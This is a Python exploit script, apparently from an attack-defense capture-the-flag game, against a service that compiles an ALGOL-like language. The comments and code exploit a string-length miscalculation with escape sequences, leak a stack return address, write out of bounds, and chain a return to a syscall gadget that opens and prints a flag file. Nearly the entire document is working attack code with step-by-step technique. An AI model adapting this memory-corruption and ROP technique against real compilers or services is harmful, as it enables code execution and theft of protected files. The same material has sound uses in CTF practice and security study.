import utils
import pwn

utils.PATCH_RODATA_OR_RECOMPILE = False

# Exploits mismatched string length calculation with escape handling.
# This exploit expects compiler not overriding stackframe with uninitialized local variables.
# This exploits expects stack arguments in (reverse) order of usage.
# This exploit expects default calling convention.

# Using "\x\x\x" leads to 3 null bytes in assembler.
# But compiler thinks each \x is followed by 2 hex digits thus 3 bytes less in unescaped from.
# So calculated length is 6 + 1 - 3 * 3 = -2.

# Call function "add" that does a bit of recursion.
# In main the "beforeArr", "arr" and "afterArr" are expected to be placed after each other on stack.
# Then write 9 bytes out of bounds into "beforeArr".
# Repeat:
# - Write 0x0101010101010101 into the array to extend "beforeArr" as continuous string.
# - Copy "beforeArr" to larger global string variable to avoid fail index check by length
#   (teams might add this check).
# - check if next two bytes after 0x01..01 are non zero -> break; this must return address from add() 
#   (check both bytes cause add(8) pushes values < 8 onto stack)
# Then convert global[i:i+8] into an integer value.
# Now we write onto the stack out of bounds using "afterArr" and large string constants with negative calculated length (\7\7...).
# We expected exactly 4 callee save regs (cloud iterate in real exploit).
# Now place the mini ROP-Chain in reverse order: ret to syscall gadget, ret to $top.
# First write the return to $top at &afterArr[8 * 6] for the return from syscall.
# Then write the syscall addr at &afterArr[8 * 5].
# However because we use $strcat we cannot copy the two null bytes at the top of the syscall addr.
# Therefore we first write a 7-byte-string at &afterArr[8 * 5] to fill afterArr[8 * 5 + 7] with a zero.
# 
# Before return set the first 2 arguments a,b expected to be rsi,rdi
# and set rax==2==SYS_open using the retun value of main for the syscall.
# To include the flagId in the binary just print it latter.
slash7 = "\\7"
exploit_code = f"""
'BEGIN'
  'STRING' global[1024];

  'INTEGER' 'PROCEDURE' add(n);
    'INTEGER' n;
    add := 'IF' n > 0 'THEN' add(n-1) + 1 'ELSE' 0;

  'INTEGER' 'PROCEDURE' main(a,b);
    'INTEGER' a,b;
    'STRING' beforeArr, afterArr[8];
    'INTEGER' 'ARRAY' arr[10];
  'BEGIN'
    'INTEGER' i;
    'INTEGER' retAddr;
    afterArr := "";
    arr[0] := 0;
    beforeArr := "aaaaaaa\\7";
    
    'FOR' i := 16 'STEP' 8 'UNTIL' 80 'DO' 'BEGIN'
      arr[(i÷8)-2] := {0x0101010101010101};
      global := beforeArr;
      'IF' global[i] ≠ 0 ∧ global[i+1] ≠ 0 'THEN' 'BEGIN'
        retAddr := global[i]
          + global[i+1] × {256**1}
          + global[i+2] × {256**2}
          + global[i+3] × {256**3}
          + global[i+4] × {256**4}
          + global[i+5] × {256**5};
        i := 80
      'END'
    'END';

    outinteger(retAddr);
    outchar(10);

    valueToStr(%d + retAddr);
    afterArr := "{slash7 * 8 * 6}" + valueStr;
    afterArr := "{slash7 * 8 * 5}" + "1234567";
    valueToStr(%d + retAddr);
    afterArr := "{slash7 * 8 * 5}" + valueStr;

    main := 2;
    a := %d + retAddr;
    b := 0
  'END';

  'STRING' valueStr[9];
  'PROCEDURE' valueToStr(x);
    'INTEGER' x, i;
  'BEGIN'
    valueStr := "aaaaaaaa";
    'FOR' i := 0 'STEP' 1 'UNTIL' 8 'DO' 'BEGIN'
      'IF' x = 0 'THEN' 'BEGIN'
        'FOR' x := 7 'STEP' -1 'UNTIL' i 'DO'
          valueStr[x] := 0;
        i := 9
      'END' 'ELSE'
        valueStr[i] := x - ((x ÷ 256) × 256);
      x := x ÷ 256;
    'END'
  'END';

  'INTEGER' fd;
  fd := add(8);
  fd := main(fd,2);
  outstring(readstring(fd));
  outchar(10);
  outstring("%s");
'END'
"""

# mustn't be larger 2 ** 63 - 1
pattern1 = 0x3F3F3F3F3F3F3F3F
pattern2 = 0x6F6F6F6F6F6F6F6F
pattern3 = 0x4F4F4F4F4F4F4F4F

def main(host, flag_id):
    # compile code with patterns for the offset constants
    code = exploit_code % (pattern1, pattern2, pattern3, flag_id)
    json, elf = utils.compileCode(host, code)

    # get value of recusive return address in add
    addRetAdddr = utils.getOffsetForReturnFromFirstCall(elf, "add")
    print("addRetAdddr", hex(addRetAdddr))

    # get value of return address in main to $top
    mainRetAddr = getOffsetForReturnFromSecondCall(elf, "$top")
    print("mainRetAddr", hex(mainRetAddr))

    # find the syscall instr in openWOConfidential
    syscall_off = utils.findSyscallInOpenWOConfidential(elf)
    print("syscall_off", hex(syscall_off))

    # find flagId in strings
    flagId_off = utils.findInStrings(elf, flag_id.encode())
    print("flagId_off", hex(flagId_off))

    # patch rodata or recompile
    json = utils.replacePatternWith(host, json, elf, code, replacements=[
        # pattern1 is the offset from addRetAdddr to mainRet
        (pattern1, mainRetAddr - addRetAdddr),
        # pattern2 is the offset from addRetAdddr to syscall
        (pattern2, syscall_off - addRetAdddr),
        # pattern3 is the offset from addRetAdddr to flagId
        (pattern3, flagId_off - addRetAdddr)
    ])

    # execute binary
    stdout = utils.executeAndRetStdout(host, json)
    print(stdout)

def getOffsetForReturnFromSecondCall(elf: pwn.ELF, functionName: str) -> int:
    # disassemble first 200 bytes
    topAsm = elf.disasm(elf.symbols[functionName], 200)
    # find second call instruction
    afterCall = topAsm.split("call ")[2]
    # get next instruction
    _, _, afterCall = afterCall.partition("\n")
    # and parse offset
    afterCall, _, _ = afterCall.partition(":")
    return int(afterCall, 16)

utils.launchExploit(main)
